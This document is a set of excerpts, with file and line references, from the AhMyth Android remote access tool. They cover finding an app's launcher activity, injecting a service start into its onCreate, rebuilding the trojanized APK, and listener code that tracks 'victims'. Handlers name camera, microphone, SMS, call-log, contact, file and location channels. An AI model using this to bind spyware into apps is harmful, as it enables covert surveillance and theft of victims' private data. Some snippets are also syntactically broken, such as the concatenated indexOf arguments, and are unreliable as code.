// Launcher Extraction for "<application" attribute | AppCtrl.js = Line 5658 --> 5707 |
// ================================================ | =============================== |
function GetLauncherPath(manifest, smaliPath) {


    var regex = /<application/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf(
        'android.intent.action.MAIN'
        'android.intent.category.DEFAULT',
        +
        'android.intent.action.MAIN'
        'android.intent.category.INFO',
        +
        'android.intent.action.MAIN'
        'android.intent.category.LAUNCHER'
        );
    var indexOfApplication = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfApplication = indices[i];
                manifest = manifest.substring(indexOfApplication, manifest.length);
                break;
            }
        }


        if (indexOfApplication != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(1, manifest.indexOf('"'))
                manifest = path.join(smaliPath, manifest) + '.smali';
                var files = fs.walkSync(smaliPath);
                for (var i = 0; i < files.length; i++) {
                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
                        return files[i];
                }

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }

  

// OrgAppKey2 | Constants.js = Line 32 |
// ========== | ====================== |
exports.orgAppKey2 = ';->onCreate()V';



// OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
// ======================== | =============================== |
var key = CONSTANTS.orgAppKey2;
$appCtrl.Log("Modifiying launcher activity...");
var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
fs.writeFile(launcherPath, output, 'utf8', (error) => {
    if (error) {
        $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
        return;
    }
    
// manifest replacement function | AppCtrl.js = Line 2849 --> 2860 |
// ============================= | =============================== |
    
                            fs.copyFile(path.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                              if (err) throw err;
                            
                              $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
                              $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);                        

                            });
                          });
                    });
            });

    }
    
// Stop function for the AhMyth Listener | AppCtrl.js = Line 133 --> 165 |
// ===================================== | ============================= |
        // when user clicks Listen button
    $appCtrl.Stop = (port) => {
      if (!port) {
          port = CONSTANTS.defaultPort;
      }

      // notify the main proccess about the port and let him stop listening
      ipcRenderer.send("SocketIO:Stop", port);
      $appCtrl.Log("Stopped Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
  }


  // fired if listening brings error
  ipcRenderer.on("SocketIO:Stop", (event, error) => {
      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
          $appCtrl.isListen = false;
          $appCtrl.$apply()
  });


  // fired when main proccess (main.js) send any new notification about disconnected victim
  ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
      $appCtrl.Log("Server disconnected " + viclist[index].ip);
      // delete him from list
      delete viclist[index];
      $appCtrl.$apply();
  });


  // notify the main proccess (main.js) to close the lab
  $appCtrl.closeLab = (index) => {
      ipcRenderer.send('closeLabWindow', 'lab.html', index);
    }
  
  
// Stop function for the AhMyth Listener | Main.js = Line 262 --> Line 333 |
// ===================================== | =============================== |
 
  // fired when stopped listening
  // It will be fired when AppCtrl emit this event
  ipcMain.on('SocketIO:Stop', function (event, port) {

  // stop listening
  IO = IO.close(port);
  IO.sockets.pingInterval = 10000;
  IO.sockets.on('connection', function (socket) {

    socket.on('disconnect', function () {
      // Decrease the socket count on a disconnect
      victimsList.rmVictim(index);

      //notify renderer proccess (AppCtrl) about the disconnected Victim
      win.webContents.send('SocketIO:RemoveVictim', index);

      if (windows[index]) {
        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
        //delete the window from windowsList
        delete windows[index]
      }
    });

  });

});


//handle the Uncaught Exceptions




// Fired when Victim's Lab is closed
ipcMain.on('closeLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 700,
    height: 750,
    show: false,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true
    }
  })

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});
